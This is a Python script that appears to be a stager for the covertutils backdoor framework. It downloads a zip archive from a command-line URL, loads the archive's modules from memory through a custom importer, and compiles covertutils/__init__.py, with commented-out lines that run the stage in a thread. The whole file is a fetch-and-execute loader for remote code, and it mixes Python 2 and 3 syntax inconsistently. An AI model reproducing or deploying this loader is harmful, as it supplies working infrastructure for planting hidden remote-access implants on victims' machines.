from __future__ import print_function
from future import standard_library
standard_library.install_aliases()
from builtins import range
import urllib.request, urllib.error, urllib.parse, sys
from threading import Thread

retries = 5
url = sys.argv[1]

def exec_ (m ) :
	exec (m, globals())
	sys.exit(0)


import os
import imp
import zipfile
import io

# Found in : https://stackoverflow.com/questions/39135750/python-load-zip-with-modules-from-memory
class ZipImporter(object):
    def __init__(self, zip_file):
        self.z = zip_file
        self.zfile = zipfile.ZipFile(self.z)
        self._paths = [x.filename for x in self.zfile.filelist]

    def _mod_to_paths(self, fullname):
        # get the python module name
        py_filename = fullname.replace(".", os.sep) + ".py"
        # get the filename if it is a package/subpackage
        py_package = fullname.replace(".", os.sep, fullname.count(".") - 1) + "/__init__.py"
        if py_filename in self._paths:
            return py_filename
        elif py_package in self._paths:
            return py_package
        else:
            return None

    def find_module(self, fullname, path):
        if self._mod_to_paths(fullname) is not None:
            return self
        return None

    def load_module(self, fullname):
        filename = self._mod_to_paths(fullname)
        if not filename in self._paths:
            raise ImportError(fullname)
        new_module = imp.new_module(fullname)
        exec self.zfile.open(filename, 'r').read() in new_module.__dict__
        new_module.__file__ = filename
        new_module.__loader__ = self
        if filename.endswith("__init__.py"):
            new_module.__path__ = []
            new_module.__package__ = fullname
        else:
            new_module.__package__ = fullname.rpartition('.')[0]
        return new_module





for i in range(retries) :
	response = urllib.request.urlopen( url )
	try :
		data = response.read()
	except :
		continue
	# print(html)
	zipbytes = io.BytesIO(data)

	zfile_obj = zipfile.ZipFile(zipbytes)
	import runpy
	zip_import = ZipImporter(zipbytes)
	sys.meta_path.append(zip_import)
	# print (covertutils)
	# import covertutils
	# runpy._run_module_as_main("covertutils")
	# exec(zfile_obj.read('covertutils/__init__.py'))
	code = runpy._get_code_from_file(zfile_obj.read('covertutils/__init__.py'))

	# import covertutils
	# from covertutils import main
	# import covertutils.handlers
	# print (covertutils)
	# import main
	# compiled_stage = compile(html, '<string>', 'exec')
	#
	# thr = Thread( target = exec_, args = (compiled_stage,) )
	# thr.start()

	break


# thr.join()
